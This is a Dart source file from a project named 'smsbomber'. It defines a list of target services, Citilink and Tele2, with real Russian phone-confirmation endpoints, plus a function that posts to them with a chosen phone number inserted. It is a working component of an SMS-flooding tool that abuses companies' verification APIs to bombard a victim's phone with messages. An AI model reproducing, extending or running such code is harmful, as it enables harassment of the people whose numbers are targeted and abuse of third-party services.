part of smsbomber;

final serviceList = <Service>[
  Service(
    name: "Citilink",
    url: Uri(
      scheme: "https",
      host: "www.citilink.ru",
      path: "registration/confirm/phone/+7{phone}",
    ),
    country: Country.RU,
  ),
  Service(
    name: "Tele2",
    url: Uri(
      scheme: "https",
      host: "msk.tele2.ru",
      path: "api/validation/number/7{phone}",
    ),
    country: Country.RU,
    process: (service, phone) => _dio.post(
      service.url.toString().replaceFirst("%7Bphone%7D", "$phone"),
      data: jsonEncode(const {"sender": "Tele2"}),
    ),
  )
];
